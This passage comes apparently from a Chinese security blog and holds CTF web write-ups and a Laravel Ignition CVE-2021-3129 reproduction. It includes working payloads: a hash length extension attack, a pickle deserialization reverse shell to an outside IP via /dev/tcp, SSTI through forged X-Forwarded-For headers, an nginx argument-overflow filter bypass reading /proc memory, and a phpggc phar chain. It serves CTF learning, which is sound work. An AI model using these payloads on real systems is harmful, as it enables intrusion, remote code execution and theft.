CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-decode|convert.base64-decode\n```\n\n## give me flag\n\n```php\n<?php\ninclude('flag.php');\n$FLAG_md5 = md5($FLAG);\nif(!isset($_GET['md5']) || !isset($_GET['value']))\n{\n    highlight_file(__FILE__);\n    die($FLAG_md5);\n}\n\n$value = $_GET['value'];\n$md5 = $_GET['md5'];\n$time = time();\n\nif(md5($FLAG.$value.$time)===$md5)\n{\n    echo \"yes, give you flag: \";\n    echo $FLAG;\n}\n31b81f48a29befbbe01d322512a8a100\n```\n\n哈希长度拓展攻击https://ciphersaw.me/2017/11/12/hash-length-extension-attack/，emmm看不懂，直接用工具一把梭了\n\n工具:https://github.com/shellfeel/hash-ext-attack\n\n```sh\nroot@dkhkdmY30sV7Pxs8awAZ:/opt/hash-ext-attack# python3 hash_ext_attack.py \n2025-07-16 07:34:47.220 | DEBUG    | common.md5_manual:__init__:17 - init......\n请输入已知明文：\n请输入已知hash： 31b81f48a29befbbe01d322512a8a100\n请输入扩展字符: 1752651375\n请输入密钥长度：43\n2025-07-16 07:36:51.547 | INFO     | common.HashExtAttack:run:65 - 已知明文：b''\n2025-07-16 07:36:51.548 | INFO     | common.HashExtAttack:run:66 - 已知hash：b'31b81f48a29befbbe01d322512a8a100'\n2025-07-16 07:36:51.548 | INFO     | common.HashExtAttack:run:68 - 新明文：b'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00X\\x01\\x00\\x00\\x00\\x00\\x00\\x001752651375'\n2025-07-16 07:36:51.549 | INFO     | common.HashExtAttack:run:69 - 新明文(url编码)：%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%001752651375\n2025-07-16 07:36:51.549 | INFO     | common.HashExtAttack:run:71 - 新hash:26c02b957a2e0467a3eeaa52823fa233\n```\n\n然后用脚本爆一下\n\n```python\nimport requests\n\nurl = \"http://gz.imxbt.cn:20960/?md5=cc2131f5409a81b2fcf18102b8d0e07e&value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00\"\nwhile True:\n\n    r = requests.get(url)\n    if \"yes, give you flag\" in r.text:\n        print(r.text)\n\n        exit(0)\n```\n\n## baby_unserialize\n\n源码中有`<!--try /ser-->`，访问看看\n\n![image-20250716163058746](../image/achieve/202411/XYCTF2024/image-20250716163058746.png)\n\n一个base64的反序列化口子，但是不知道参数，分别用get和post传看看\n\n![image-20250716164221945](../image/achieve/202411/XYCTF2024/image-20250716164221945.png)\n\n看到payload就是参数了，盲猜一手java反序列化，先用URLDNS看看能不能出网\n\n## login\n\n有一个register.php路由，注册后登录进去发现没东西，但是在cookie中发现一个RememberMe的cookie\n\n```http\ngASVOQAAAAAAAACMA2FwcJSMBUxvZ2lulJOUKYGUfZQojARuYW1llIwFYWRtaW6UjANwd2SUjAhhZG1pbjEyM5R1Yi4=\n```\n\n![image-20250716165717617](../image/achieve/202411/XYCTF2024/image-20250716165717617.png)\n\n有东西，然后看到是python，一坨AAAA，猜测这里是pickle的特征，估计是dumps之后并进行base64加密的cookie\n\n写一个test试一下\n\n```python\nimport base64\nimport pickle\nimport os\n\nclass test :\n    def __reduce__(self):\n        command = r\"whoami\"\n        return (os.system,(command,))\na = test()\ntest = pickle.dumps(a)\nprint(base64.b64encode(test))\n```\n\n但是传进去后提示waf，估计是`__reduce__`被过滤了，那我们写字节码吧\n\n```python\nimport base64\n\npayload = '''cos\nsystem\n(S\"whoami\"\ntR.\n'''\nprint(base64.b64encode(payload.encode()))\n```\n\n发现还是不行，估计还过滤了东西，最后测出来过滤了system和import等，用popen吧\n\n```python\nimport base64\nopcode = b'''(S'bash -c \"bash -i >& /dev/tcp/124.223.25.186/2333 0>&1\"'\nios\npopen\n.'''\n\nprint(base64.b64encode(opcode))\n```\n\n传入后发现返回5，那就直接反弹shell\n\n![image-20250716172853056](../image/achieve/202411/XYCTF2024/image-20250716172853056.png)\n\n先看看源码吧\n\n```python\nimport hashlib\nimport os\nimport pickle\nimport base64\nimport hashlib\nfrom flask import Flask,request,session,render_template,redirect,make_response\n\nclass Login:\n    def __init__(self,name,pwd):\n        self.name = name\n        self.pwd = pwd\n\n\n\ndef checkLogin(users,name,pwd):\n    for user in users:\n        if user.name == name and user.pwd == user.pwd:\n            return True\n    return False\n\ndef getUserclass(users,name,pwd):\n    for user in users:\n        if user.name == name and user.pwd == user.pwd:\n            return user\n    return None\n\ndef waf(data):\n    if b'R' in data or b'r' in data:\n        return False\n    return True\n\n\n \napp=Flask(__name__)\nusers = []\n\n# pickle\n@app.route('/',methods=['GET','POST'])\n@app.route('/index.php',methods=['GET','POST'])\ndef index():\n    try:\n        RememberMe = request.cookies.get('RememberMe')\n        print(RememberMe)\n        pickle_data = base64.b64decode(RememberMe)\n        print(pickle_data)\n        if waf(pickle_data):\n            print(pickle_data)\n            user_class = pickle.loads(pickle_data)\n            #print(user_class)\n            return \"hello world!  {}\".format(user_class.name)\n        else:\n            return \"waf!!!!\"      \n    except:\n        return redirect(\"login.php\")\n    \n# 登录\n@app.route('/login.php',methods=['GET','POST'])\ndef login():\n    if request.method==\"POST\" and (username:=request.form.get('username')) and (password:=request.form.get('password')):\n        if type(username)==str and type(password)==str and checkLogin(users,username,password):\n            user_class = getUserclass(users,username,password)\n            RememberMe = base64.b64encode(pickle.dumps(user_class))\n            res=make_response(\"Login success! <a href='/'>Click here to redirect.</a>\");\n            res.set_cookie('RememberMe',RememberMe.decode('utf-8'))\n            return res\n        else:\n            return \"Login fail!\"\n    return render_template(\"login.html\")\n\n# 注册\n@app.route('/register.php',methods=['GET','POST'])\ndef register():\n    if request.method==\"POST\" and (username:=request.form.get('username')) and (password:=request.form.get('password')):\n        if type(username)==str and type(password)==str:\n            for user in users:\n                if user.name == username:\n                    return \"Register fail!\"\n            users.append(Login(username,password))\n            return \"Register successs! Your username is {username}.\".format(username=username)\n        else:\n            return \"Register fail!\"\n    return render_template(\"register.html\")\n    \nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000)\n```\n\n","tags":["XYCTF2024"],"categories":["赛题wp"]},{"title":"CVE-2021-3129漏洞复现","url":"/2025/07/14/CVE-2021-3129漏洞复现/","content":"\n## 0x01漏洞信息\n\nhttps://nvd.nist.gov/vuln/detail/cve-2021-3129\n\n当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。\n\n## 0x02版本限制\n\nLaravel 及其他产品中使用的 Ignition 2.5.2 之前的版本\n\n## 0x03漏洞分析\n\n首先我们到执行solution的控制器ExecuteSolutionController.php里面中去看看是如何调用solution的\n\n```php\n<?php\n\nnamespace Facade\\Ignition\\Http\\Controllers;\n\nuse Facade\\Ignition\\Http\\Requests\\ExecuteSolutionRequest;\nuse Facade\\IgnitionContracts\\SolutionProviderRepository;\nuse Illuminate\\Foundation\\Validation\\ValidatesRequests;\n\nclass ExecuteSolutionController\n{\n    use ValidatesRequests;\n\n    public function __invoke(\n        ExecuteSolutionRequest $request,\n        SolutionProviderRepository $solutionProviderRepository\n    ) {\n        $solution = $request->getRunnableSolution();\n\n        $solution->run($request->get('parameters', []));\n\n        return response('');\n    }\n}\n\n```\n\n先是通过getRunnableSolution()的调用去获取到solution明，然后调用solution对象中的run方法，并将获取到的可控的parameters参数传递过去，利用这个点我们可以调用MakeViewVariableOptionalSolutio::run()方法\n\n跟进MakeViewVariableOptionalSolution中的run()方法\n\n```php\n    public function run(array $parameters = [])\n    {\n        $output = $this->makeOptional($parameters);\n        if ($output !== false) {\n            file_put_contents($parameters['viewFile'], $output);\n        }\n    }\n```\n\n这里的话有一个file_put_contents()方法，文件名取决于我们传递的参数parameters数组中viewFile的值。但是前面还调用了一个makeOptional方法\n\n![image-20250714164119821](../image/achieve/202411/CVE复现/image-20250714164119821.png)\n\n这里可以看到，在makeOptional()方法中会将$parameters中viewFile指向的文件中的`$variableName`换成`$variableName??`，之后并写回文件中，但是这里其实没啥作用，不影响我们的调用。\n\n由于这里调用了`file_get_contents()`，且其中的参数可控，所以这里可以通过`phar://`协议去触发phar反序列化。如果后期利用框架进行开发的人员写出了一个文件上传的功能，那么我们就可以上传一个恶意phar文件，利用上述的`file_get_contents()`去触发phar反序列化，达到RCE的效果。\n\n## 0x04漏洞复现\n\n可以直接从phpggc中拿一条laravel中存在的拓展的链子\n\nhttps://github.com/ambionics/phpggc\n\n```sh\nphp -d \"phar.readonly=0\" ./phpggc Laravel/RCE5 \"phpinfo();\" --phar phar -o /tmp/phar.gif\n```\n\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"L3HCTF-web","url":"/2025/07/12/L3HCTF-web/","content":"\n## best_profile\n\n把附件下下来看看\n\n```python\nimport os\nimport re\nimport random\nimport string\nimport requests\nfrom flask import (\n    Flask,\n    render_template,\n    request,\n    redirect,\n    url_for,\n    render_template_string,\n)\nfrom flask_sqlalchemy import SQLAlchemy\nfrom flask_login import (\n    LoginManager,\n    UserMixin,\n    login_user,\n    login_required,\n    logout_user,\n    current_user,\n)\nfrom sqlalchemy.orm import DeclarativeBase\nfrom sqlalchemy.orm import Mapped, mapped_column\nfrom werkzeug.security import generate_password_hash, check_password_hash\nfrom werkzeug.middleware.proxy_fix import ProxyFix\nimport geoip2.database\n\n\nclass Base(DeclarativeBase):\n    pass\n\n\ndb = SQLAlchemy(model_class=Base)\n\n\nclass User(db.Model, UserMixin):\n    id: Mapped[int] = mapped_column(primary_key=True)\n    username: Mapped[str] = mapped_column(unique=True)\n    password: Mapped[str] = mapped_column()\n    bio: Mapped[str] = mapped_column()\n    last_ip: Mapped[str] = mapped_column(nullable=True)\n\n    def set_password(self, password):\n        self.password = generate_password_hash(password)\n\n    def check_password(self, password):\n        return check_password_hash(self.password, password)\n\n    def __repr__(self):\n        return \"<User %r>\" % self.name\n\n\napp = Flask(__name__)\napp.config[\"SQLALCHEMY_DATABASE_URI\"] = \"sqlite:///data.db\"\napp.config[\"SECRET_KEY\"] = os.urandom(24)\napp.wsgi_app = ProxyFix(app.wsgi_app)\n\ndb.init_app(app)\nwith app.app_context():\n    db.create_all()\n\nlogin_manager = LoginManager(app)\n\n\ndef gen_random_string(length=20):\n    return \"\".join(random.choices(string.ascii_letters, k=length))\n\n\n@login_manager.user_loader\ndef load_user(user_id):\n    user = User.query.get(int(user_id))\n    return user\n\n\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef route_login():\n    if request.method == \"POST\":\n        username = request.form[\"username\"]\n        password = request.form[\"password\"]\n        if not username or not password:\n            return \"Invalid username or password.\"\n        user = User.query.filter_by(username=username).first()\n        if user and user.check_password(password):\n            login_user(user)\n            return redirect(url_for(\"route_profile\", username=user.username))\n        else:\n            return \"Invalid username or password.\"\n    return render_template(\"login.html\")\n\n\n@app.route(\"/logout\")\n@login_required\ndef route_logout():\n    logout_user()\n    return redirect(url_for(\"index\"))\n\n\n@app.route(\"/register\", methods=[\"GET\", \"POST\"])\ndef route_register():\n    if request.method == \"POST\":\n        username = request.form[\"username\"]\n        password = request.form[\"password\"]\n        bio = request.form[\"bio\"]\n        if not username or not password:\n            return \"Invalid username or password.\"\n        user = User.query.filter_by(username=username).first()\n        if user:\n            return \"Username already exists.\"\n        user = User(username=username, bio=bio)\n        user.set_password(password)\n        db.session.add(user)\n        db.session.commit()\n        return redirect(url_for(\"route_login\"))\n    return render_template(\"register.html\")\n\n\n@app.route(\"/<string:username>\")\ndef route_profile(username):\n    user = User.query.filter_by(username=username).first()\n    return render_template(\"profile.html\", user=user)\n\n\n@app.route(\"/get_last_ip/<string:username>\", methods=[\"GET\", \"POST\"])\ndef route_check_ip(username):\n    if not current_user.is_authenticated:\n        return \"You need to login first.\"\n    user = User.query.filter_by(username=username).first()\n    if not user:\n        return \"User not found.\"\n    return render_template(\"last_ip.html\", last_ip=user.last_ip)\n\ngeoip2_reader = geoip2.database.Reader(\"GeoLite2-Country.mmdb\")\n@app.route(\"/ip_detail/<string:username>\", methods=[\"GET\"])\ndef route_ip_detail(username):\n    res = requests.get(f\"http://127.0.0.1/get_last_ip/{username}\")\n    if res.status_code != 200:\n        return \"Get last ip failed.\"\n    last_ip = res.text\n    try:\n        ip = re.findall(r\"\\d+\\.\\d+\\.\\d+\\.\\d+\", last_ip)\n        country = geoip2_reader.country(ip)\n    except (ValueError, TypeError):\n        country = \"Unknown\"\n    template = f\"\"\"\n    <h1>IP Detail</h1>\n    <div>{last_ip}</div>\n    <p>Country:{country}</p>\n    \"\"\"\n    return render_template_string(template)\n\n\n@app.route(\"/\")\ndef index():\n    return render_template(\"index.html\")\n\n\n@app.after_request\ndef set_last_ip(response):\n    if current_user.is_authenticated:\n        current_user.last_ip = request.remote_addr\n        db.session.commit()\n    return response\n\n\nif __name__ == \"__main__\":\n    app.run()\n\n```\n\n使用了ProxyFix中间件\n\n```python\nfrom werkzeug.middleware.proxy_fix import ProxyFix\napp.wsgi_app = ProxyFix(app.wsgi_app)\n```\n\nProxyFix中间件的作用是从代理服务器传递的请求头中获取客户端的真实IP地址。该中间件是设置在反向代理后的一个组件，他会读取XFF头并将其设置为REMOTE_ADDR，所以Flask中的request.remote_addr在经过处理后的话实际上取决于XFF头的IP地址\n\n这些路由的话其实很明显能看到`/ip_detail/<string:username>`只有这个路由的渲染是直接渲染的，可以打ssti，然后我们看一下渲染的内容\n\n```python\ntemplate = f\"\"\"\n    <h1>IP Detail</h1>\n    <div>{last_ip}</div>\n    <p>Country:{country}</p>\n    \"\"\"\n```\n\n这里的话last_ip就是请求后的返回响应内容，然后我们看一下请求的路由\n\n```python\n@app.route(\"/get_last_ip/<string:username>\", methods=[\"GET\", \"POST\"])\ndef route_check_ip(username):\n    if not current_user.is_authenticated:\n        return \"You need to login first.\"\n    user = User.query.filter_by(username=username).first()\n    if not user:\n        return \"User not found.\"\n    return render_template(\"last_ip.html\", last_ip=user.last_ip)\n```\n\n更直观点，直接注册一个看看就知道了\n\n`/<string:username>`路由\n\n![image-20250712162327755](../image/achieve/202411/L3HCTF/image-20250712162327755.png)\n\n`/get_last_ip/<string:username>`路由\n\n![image-20250712162427241](../image/achieve/202411/L3HCTF/image-20250712162427241.png)\n\n可以看到返回了一个ip地址，联想到XFF头看看能不能伪造IP\n\n![image-20250712162839164](../image/achieve/202411/L3HCTF/image-20250712162839164.png)\n\n既然可以渲染出来，并且在最后的ip_detail路由下有ssti的存在，更是有对`get_last_ip`的请求，那么可以尝试XFF头的ssti，但是有一个问题，就是这里的请求是不携带Cookie的，也就是说他正常的请求是无法通过`get_last_ip`路由中队用户是否登录的验证的，所以我们需要绕过这个设置，让我们的请求走到我们需要利用的页面\n\n后面看了一下附件里面还有一个nginx的配置文件\n\n```sh\n        location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ {\n            proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;\n            proxy_pass http://127.0.0.1:5000;\n            proxy_cache static;\n            proxy_cache_valid 200 302 30d;\n        }\n\n        location ~ .*\\.(js|css)?$ {\n            proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;\n            proxy_pass http://127.0.0.1:5000;\n            proxy_cache static;\n            proxy_cache_valid 200 302 12h;\n        }\n```\n\n可以看到，这里如果有`*\\.(gif|jpg|jpeg|png|bmp|swf`这类资源的话就会送到nginx缓存中保存30天，那我们就可以利用这个去保存我们自己构造的带有XFF头伪造的get_last_ip路由的网页，例如`/get_last_ip/1.swf`\n\n但是这里需要注意的是一个设置ip的函数\n\n```python\n@app.after_request\ndef set_last_ip(response):\n    if current_user.is_authenticated:\n        current_user.last_ip = request.remote_addr\n        db.session.commit()\n    return response\n```\n\n这里的话会在每次请求后接收响应内容中的request.remote_addr然后给last_ip赋值，因为前面看中间件的时候我们就知道这里的request.remote_addr取决于XFF头中的IP地址，那我们这个是可以利用的，具体怎么利用呢？往下看就知道了\n\n先注册一个1.swf的用户并登录，登录后抓包\n\n```http\nGET //get_last_ip/1.swf HTTP/1.1\nHost: 61.147.171.103:63956\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://61.147.171.103:63956/login\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nX-Forwarded-For: {{8*8}}\nCookie: session=.eJwlzssNwkAMBcBe9szB9v5smok29rPgmsAJ0TuRKGCk-ZQtD5yPcn8db9zK9oxyLy7CYUC3umZKV7eGCo5MC--LbWaXRTl8RkBqsFLbfaiCrS9XrMlV-xQNwGxSVEvYJRNOIzWEqO5K4g2JVTXbPghtDm5arsj7xPHfcPn-ABXhL_k.aHI2Pg.xKU7v5-b5PDNBQl_5CJpvEsp8NA\nConnection: keep-alive\n\n\n```\n\n改一下路由，然后添加XFF头，这里的话有人会问为什么是`//get_last_ip/1.swf`而不是`/get_last_ip/1.swf`，这里的话就是为了set_last_ip函数的执行赋值操作，那么这次发包之后我们的last_ip就变成`{{8*8}}`了，然后我们再改回去\n\n```http\nGET /get_last_ip/1.swf HTTP/1.1\nHost: 61.147.171.103:63956\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://61.147.171.103:63956/login\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: session=.eJwlzssNwkAMBcBe9szB9v5smok29rPgmsAJ0TuRKGCk-ZQtD5yPcn8db9zK9oxyLy7CYUC3umZKV7eGCo5MC--LbWaXRTl8RkBqsFLbfaiCrS9XrMlV-xQNwGxSVEvYJRNOIzWEqO5K4g2JVTXbPghtDm5arsj7xPHfcPn-ABXhL_k.aHI2Pg.xKU7v5-b5PDNBQl_5CJpvEsp8NA\nConnection: keep-alive\n\n\n```\n\n![image-20250712181618908](../image/achieve/202411/L3HCTF/image-20250712181618908.png)\n\n这样的话就是成功设置好了，那这里又有人要问，既然这里的last_ip已经改了，为什么还要访问一次`/get_last_ip/1.swf`？其实就是为了避免在/ip_detail路由下的get请求访问到的是本地请求的/get_last_ip/1.swf而不是我们自己的/get_last_ip/1.swf，这里发包之后就会根据nginx配置文件的规则存入缓存，这样后面get请求的话也就会请求缓存的文件。\n\n最后我们访问/ip_detail/1.swf就可以发现成功ssti\n\n![image-20250712181924704](../image/achieve/202411/L3HCTF/image-20250712181924704.png)\n\n然后后面的话打ssti发现引号被过滤了，那我们就用request外带去绕过\n\n```http\nGET //get_last_ip/3.swf HTTP/1.1\nHost: 61.147.171.105:59182\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://61.147.171.105:59182/login\nX-Forwarded-For: {{lipsum.__globals__[request.args.a].popen(request.args.b).read()}}\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: session=.eJwlzssNwkAMBcBe9szBa-_HpploYz8LrgmcEL0TiQJGmk_Z8sD5KPfX8catbM8o9-LMNQzoJmsmd3VrENTItPC-qs3svCiHzwiwRFVquw9VVOvLFWtW0T5ZAzCbFGIJu2TCaaQGE8muxN6QWKLZ9kFoc9Sm5Yq8Txz_jZTvDxXnL_s.aHJn5A.2iWFkAUbTpjti5vB8XeT1loDExA\nConnection: keep-alive\n\n\n```\n\n![image-20250712215559409](../image/achieve/202411/L3HCTF/image-20250712215559409.png)\n\n然后传入a和b就行\n\n```http\n?a=os&b=tac /flag\n```\n\n![image-20250712215614350](../image/achieve/202411/L3HCTF/image-20250712215614350.png)\n\n## gateway_advance（部分复现）\n\n看看源码中有nginx的配置文件，里面是Lua脚本\n\n```lua\nworker_processes 1;\n\nevents {\n    use epoll;\n    worker_connections 10240;\n}\n\nhttp {\n    include mime.types;\n    default_type text/html;\n    access_log off;\n    error_log /dev/null;\n    sendfile on;\n\n    init_by_lua_block {\n        f = io.open(\"/flag\", \"r\")\n        f2 = io.open(\"/password\", \"r\")\n        flag = f:read(\"*all\")\n        password = f2:read(\"*all\")\n        f:close()\n        password = string.gsub(password, \"[\\n\\r]\", \"\")\n        os.remove(\"/flag\")\n        os.remove(\"/password\")\n    }\n\n    server {\n        listen 80 default_server;\n        location / {\n            content_by_lua_block {\n                ngx.say(\"hello, world!\")\n            }\n        }\n\n        location /static {\n            alias /www/;\n            access_by_lua_block {\n                if ngx.var.remote_addr ~= \"127.0.0.1\" then\n                    ngx.exit(403)\n                end\n            }\n            add_header Accept-Ranges bytes;\n        }\n\n        location /download {\n            access_by_lua_block {\n                local blacklist = {\"%.\", \"/\", \";\", \"flag\", \"proc\"}\n                local args = ngx.req.get_uri_args()\n                for k, v in pairs(args) do\n                    for _, b in ipairs(blacklist) do\n                        if string.find(v, b) then\n                            ngx.exit(403)\n                        end\n                    end\n                end\n            }\n            add_header Content-Disposition \"attachment; filename=download.txt\";\n            proxy_pass http://127.0.0.1/static$arg_filename;\n            body_filter_by_lua_block {\n                local blacklist = {\"flag\", \"l3hsec\", \"l3hctf\", \"password\", \"secret\", \"confidential\"}\n                for _, b in ipairs(blacklist) do\n                    if string.find(ngx.arg[1], b) then\n                        ngx.arg[1] = string.rep(\"*\", string.len(ngx.arg[1]))\n                    end\n                end\n            }\n        }\n\n        location /read_anywhere {\n            access_by_lua_block {\n                if ngx.var.http_x_gateway_password ~= password then\n                    ngx.say(\"go find the password first!\")\n                    ngx.exit(403)\n                end\n            }\n            content_by_lua_block {\n                local f = io.open(ngx.var.http_x_gateway_filename, \"r\")\n                if not f then\n                    ngx.exit(404)\n                end\n                local start = tonumber(ngx.var.http_x_gateway_start) or 0\n                local length = tonumber(ngx.var.http_x_gateway_length) or 1024\n                if length > 1024 * 1024 then\n                    length = 1024 * 1024\n                end\n                f:seek(\"set\", start)\n                local content = f:read(length)\n                f:close()\n                ngx.say(content)\n                ngx.header[\"Content-Type\"] = \"application/octet-stream\"\n            }\n        }\n    }\n}\n```\n\n这里的话有三个路由，/static路由是无法访问的，/download路由是下载文件的，并且指向/static路由，但是这里的话有黑名单\n\n```lua\n        location /download {\n            access_by_lua_block {\n                local blacklist = {\"%.\", \"/\", \";\", \"flag\", \"proc\"}\n                local args = ngx.req.get_uri_args()\n                for k, v in pairs(args) do\n                    for _, b in ipairs(blacklist) do\n                        if string.find(v, b) then\n                            ngx.exit(403)\n                        end\n                    end\n                end\n        }\n```\n\n先看对URL参数的过滤上，主要是过滤了`.`、`/`、`;`、`flag`、`proc`，避免了一些目录穿越，但是注意到一个ngx.req.get_uri_args()，然后找到了这个函数的一个默认配置的漏洞\n\nhttps://github.com/p0pr0ck5/lua-resty-waf/issues/280\n\nhttps://forum.butian.net/share/91\n\n通过ngx.req.get_uri_args获取uri参数，当提交的参数超过限制数（默认限制100或可选参数限制），uri参数溢出，无法获取到限制数以后的参数值，更无法对攻击者构造的参数进行有效安全检测\n\n```http\n/download?a1=1&a2=2&a3=3&a4=4&a5=5&a6=6&a7=7&a8=8&a9=9&a10=10&a11=11&a12=12&a13=13&a14=14&a15=15&a16=16&a17=17&a18=18&a19=19&a20=20&a21=21&a22=22&a23=23&a24=24&a25=25&a26=26&a27=27&a28=28&a29=29&a30=30&a31=31&a32=32&a33=33&a34=34&a35=35&a36=36&a37=37&a38=38&a39=39&a40=40&a41=41&a42=42&a43=43&a44=44&a45=45&a46=46&a47=47&a48=48&a49=49&a50=50&a51=51&a52=52&a53=53&a54=54&a55=55&a56=56&a57=57&a58=58&a59=59&a60=60&a61=61&a62=62&a63=63&a64=64&a65=65&a66=66&a67=67&a68=68&a69=69&a70=70&a71=71&a72=72&a73=73&a74=74&a75=75&a76=76&a77=77&a78=78&a79=79&a80=80&a81=81&a82=82&a83=83&a84=84&a85=85&a86=86&a87=87&a88=88&a89=89&a90=90&a91=91&a92=92&a93=93&a94=94&a95=95&a96=96&a97=97&a98=98&a99=99&a100=100&filename=../etc/passwd\n```\n\n![image-20250714125300363](../image/achieve/202411/L3HCTF/image-20250714125300363.png)\n\n我们看一下返回逻辑\n\n```lua\n            add_header Content-Disposition \"attachment; filename=download.txt\";\n            proxy_pass http://127.0.0.1/static$arg_filename;\n            body_filter_by_lua_block {\n                local blacklist = {\"flag\", \"l3hsec\", \"l3hctf\", \"password\", \"secret\", \"confidential\"}\n                for _, b in ipairs(blacklist) do\n                    if string.find(ngx.arg[1], b) then\n                        ngx.arg[1] = string.rep(\"*\", string.len(ngx.arg[1]))\n                    end\n                end\n            }\n```\n\n这里的话会对返回内容进行一定的过滤，这时候怎么绕过呢？\n\n这里可以用Range请求头去控制返回内容\n\n```html\nRange: bytes=<start>-<end>\n允许客户端指定需要获取的资源字节范围，实现断点续传和分块下载功能。\n```\n\n![image-20250714125414248](../image/achieve/202411/L3HCTF/image-20250714125414248.png)\n\n因为是在内存中的，并且原文件已经删除了，所以我们遍历一下，最终在/proc/self/fd/6找到打开文件的进程\n\n```html\nGET /download?a1=1&a2=2&a3=3&a4=4&a5=5&a6=6&a7=7&a8=8&a9=9&a10=10&a11=11&a12=12&a13=13&a14=14&a15=15&a16=16&a17=17&a18=18&a19=19&a20=20&a21=21&a22=22&a23=23&a24=24&a25=25&a26=26&a27=27&a28=28&a29=29&a30=30&a31=31&a32=32&a33=33&a34=34&a35=35&a36=36&a37=37&a38=38&a39=39&a40=40&a41=41&a42=42&a43=43&a44=44&a45=45&a46=46&a47=47&a48=48&a49=49&a50=50&a51=51&a52=52&a53=53&a54=54&a55=55&a56=56&a57=57&a58=58&a59=59&a60=60&a61=61&a62=62&a63=63&a64=64&a65=65&a66=66&a67=67&a68=68&a69=69&a70=70&a71=71&a72=72&a73=73&a74=74&a75=75&a76=76&a77=77&a78=78&a79=79&a80=80&a81=81&a82=82&a83=83&a84=84&a85=85&a86=86&a87=87&a88=88&a89=89&a90=90&a91=91&a92=92&a93=93&a94=94&a95=95&a96=96&a97=97&a98=98&a99=99&a100=100&filename=../proc/self/fd/6 HTTP/1.1\nHost: 43.138.2.216:17794\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\n\n\n```\n\n然后用Range分片读取一下内容去绕过内容检测\n\n![image-20250714125928133](../image/achieve/202411/L3HCTF/image-20250714125928133.png)\n\n最终拿到password密码为passwordismemeispasswordsoneverwannagiveyouup\n\n拿到密码后就可以操作/read_anywhere路由了\n\n```lua\nlocation /read_anywhere {\n            access_by_lua_block {\n                if ngx.var.http_x_gateway_password ~= password then\n                    ngx.say(\"go find the password first!\")\n                    ngx.exit(403)\n                end\n            }\n            content_by_lua_block {\n                local f = io.open(ngx.var.http_x_gateway_filename, \"r\")\n                if not f then\n                    ngx.exit(404)\n                end\n                local start = tonumber(ngx.var.http_x_gateway_start) or 0\n                local length = tonumber(ngx.var.http_x_gateway_length) or 1024\n                if length > 1024 * 1024 then\n                    length = 1024 * 1024\n                end\n                f:seek(\"set\", start)\n                local content = f:read(length)\n                f:close()\n                ngx.say(content)\n                ngx.header[\"Content-Type\"] = \"application/octet-stream\"\n            }\n        }\n```\n\n这里的话需要传入四个请求头\n\n- `X-Gateway-Password` 的 HTTP 头的值就是我们刚刚获取到的password\n\n- `X-Gateway-Filename` HTTP 头的值就是我们想要读取的**文件路径**。\n- `X-Gateway-Start` HTTP 头的值。这个头预期指定从文件开始读取的**起始字节偏移量**。\n- `X-Gateway-Length` HTTP 头的值，指定要**读取的字节数**。\n\n```html\nX-Gateway-Password: passwordismemeispasswordsoneverwannagiveyouup\nX-Gateway-Filename: /etc/passwd\n```\n\n![image-20250714130557564](../image/achieve/202411/L3HCTF/image-20250714130557564.png)\n\n然后我们需要在进程里面找文件，先通过 /proc/self/maps 获得当前进程虚拟地址映射\n\n**`/proc/[PID]/maps`**: 显示该进程的内存映射信息，包括加载的库文件和可执行文件等。\n\n![image-20250714131240596](../image/achieve/202411/L3HCTF/image-20250714131240596.png)\n\n看到一个删除操作\n\n```http\n7eeead51f000-7eeead520000 rw-s 00000000 00:01 3170                       /dev/zero (deleted)\n```\n\n然后我们读一下/proc/self/mem\n\n**`/proc/[PID]/mem`**: 代表该进程的内存映像。\n\n```php\nX-Gateway-Password: passwordismemeispasswordsoneverwannagiveyouup\nX-Gateway-Filename: /proc/self/mem\nX-Gateway-Start: 0x7eeead51f000\nX-Gateway-Length: 